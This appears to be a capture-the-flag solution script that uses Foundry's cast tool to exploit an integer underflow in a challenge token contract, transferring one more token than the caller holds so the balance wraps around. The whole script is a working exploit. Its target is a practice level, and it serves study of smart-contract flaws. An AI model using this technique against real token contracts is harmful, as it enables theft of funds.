#!/usr/bin/env bash
set -e

CONTRACT="$1"

[ "$CONTRACT" == "" ] && echo "A contract address must be specified as the first argument" >&2 && exit 1
[ "$ETH_RPC_URL" == "" ] && echo "ETH_RPC_URL not set" >&2 && exit 1
[ "$CHAIN" == "" ] && echo "CHAIN not set" >&2 && exit 1

if [ "$PRIVATE_KEY" == "" ]
then
	echo "Enter private key"
	read -s "PRIVATE_KEY"
fi
PRIVATE_KEY=$(echo $PRIVATE_KEY | sed 's/^0x//')

ATTACKER_ADDRESS=$(cast wallet address --private-key ${PRIVATE_KEY} | tr [:upper:] [:lower:])

BALANCE=$(cast call ${CONTRACT} "$(cast calldata 'balanceOf(address)(uint256)' ${ATTACKER_ADDRESS})" | cast to-dec)
echo "Current balance: ${BALANCE}"

let "AMOUNT = ${BALANCE} + 1"

cast send \
	--private-key ${PRIVATE_KEY} \
	${CONTRACT} \
	$(cast calldata 'transfer(address,uint256)' \
		$(cast address-zero) \
		${AMOUNT})

NEW_BALANCE=$(cast call ${CONTRACT} "$(cast calldata 'balanceOf(address)(uint256)' ${ATTACKER_ADDRESS})" | cast to-dec)
echo "New balance: ${NEW_BALANCE}"

if [ "${NEW_BALANCE}" != "${BALANCE}" ]
then
	echo "Level completed, submit instance"
else
	echo "ERROR: Solution failed"
fi
